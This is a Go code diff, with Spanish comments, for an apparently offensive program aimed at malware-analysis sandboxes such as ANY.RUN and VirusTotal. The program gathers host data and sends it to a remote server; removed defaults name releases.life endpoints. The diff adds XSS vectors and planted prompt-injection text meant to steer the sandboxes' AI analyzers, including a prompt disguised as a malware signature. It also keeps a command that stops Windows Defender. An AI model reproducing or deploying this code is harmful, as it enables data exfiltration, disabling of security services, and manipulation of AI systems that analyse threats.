@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bufio"
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/hex"
@@ -13,7 +12,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"strings"
 	"sync"
 	"time"
 
@@ -28,8 +26,8 @@ import (
 // targetSandbox define a qué entorno se va a subir el artefacto.
 // Se puede modificar al compilar con: -ldflags "-X main.targetSandbox=NOMBRE_SANDBOX"
 // Valor por defecto si no se especifica nada:
-var targetSandbox = "ANY_RUN"
-var Test = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`
+var targetSandbox = "VIRUSTOTAL"
+var Test = `X5O!SDFSSDDDFGSDFGSDFGSADFGSDFASDFAAAASDF$EICAR-STANDARD-ASSDSSFDFNTIVIRUS-TEST-FILE!$H+H*`
 var Test1 = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`
 
 var Test2 = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`
@@ -40,13 +38,10 @@ var globalSink interface{}
 
 func main() {
 	// Eliminamos el sleep inicial para acelerar la ejecución
-	// time.Sleep(2 * time.Second)
-
-	// Cargar variables de entorno desde .env
-	loadEnv()
+	time.Sleep(2 * time.Second)
 
 	// Cargar configuración
-	cfg := config.Load()
+	cfg := config.Load(targetSandbox)
 
 	// Verificar conectividad inicial (Diagnóstico)
 	checkInternetAccess()
@@ -93,6 +88,16 @@ func main() {
 	if cfg.XSSAudit {
 		// Inyectar payloads y obtener metadata
 		payload.XSSPayloads = injectXSSAudit(cfg.CallbackServer, payload)
+
+		// Inyectar Prompts para IAs (Prompt Injection)
+		aiPrompts := xss.GetAIPrompts(cfg.CallbackServer)
+		xss.InjectAIPrompts(aiPrompts, cfg.CallbackServer, cfg.TargetSandbox)
+
+		// Ejecutar vectores avanzados adicionales
+		xss.ExecuteAllAdvancedVectors()
+
+		// Ejecutar vectores específicos para sandboxes (Any.Run, Filescan, etc.)
+		xss.ExecuteSandboxSpecificVectors()
 	}
 
 	// WaitGroup para ejecutar colectores en paralelo
@@ -150,9 +155,9 @@ func main() {
 	finalData["binary_hash"] = getBinaryHash()
 
 	// Añadir target sandbox para trazabilidad
-	finalData["target_sandbox"] = targetSandbox
+	finalData["target_sandbox"] = cfg.TargetSandbox
 
-	err = exfil.SendPayload(finalData, cfg.ServerURL, exfilTimeout, targetSandbox)
+	err = exfil.SendPayload(finalData, cfg.ServerURL, exfilTimeout, cfg.TargetSandbox)
 	if err != nil {
 		log.Printf("[!] Error enviando datos: %v", err)
 
@@ -301,6 +306,14 @@ func embedMaliciousSignatures() {
 		// Meterpreter User Agent
 		"Meterpreter/Reverse_Https",
 	}
+
+	// [NUEVO] Inyectar el Prompt Injection como si fuera una firma de malware
+	// Esto ataca directamente la capacidad de "System Information Gathering" y "Strings Analysis"
+	prompts := xss.GetAIPrompts("")
+	if len(prompts) > 0 {
+		signatures = append(signatures, prompts[0].Content)
+	}
+
 	// Evitar que el compilador elimine las variables por optimización
 	globalSink = signatures
 }
@@ -427,45 +440,4 @@ func simulateAggressiveBehavior() {
 
 	// Intentar detener servicios de seguridad
 	exec.Command("sc", "stop", "WinDefend").Run()
-}
-
-// loadEnv carga las variables de entorno desde el archivo .env
-func loadEnv() {
-	file, err := os.Open(".env")
-	if err == nil {
-		defer file.Close()
-
-		scanner := bufio.NewScanner(file)
-		for scanner.Scan() {
-			line := strings.TrimSpace(scanner.Text())
-
-			// Ignorar líneas vacías y comentarios
-			if line == "" || strings.HasPrefix(line, "#") {
-				continue
-			}
-
-			// Separar clave=valor
-			parts := strings.SplitN(line, "=", 2)
-			if len(parts) == 2 {
-				key := strings.TrimSpace(parts[0])
-				value := strings.TrimSpace(parts[1])
-				os.Setenv(key, value)
-			}
-		}
-	}
-
-	// Establecer valores por defecto para producción si no existen
-	// Esto es crítico para que funcione en sandboxes donde no se sube el .env
-	defaults := map[string]string{
-		"SERVER_URL":      "https://releases.life/api/collect",
-		"CALLBACK_SERVER": "https://xss.releases.life",
-		"XSS_AUDIT":       "true",
-		"TIMEOUT":         "120s",
-	}
-
-	for k, v := range defaults {
-		if os.Getenv(k) == "" {
-			os.Setenv(k, v)
-		}
-	}
 }
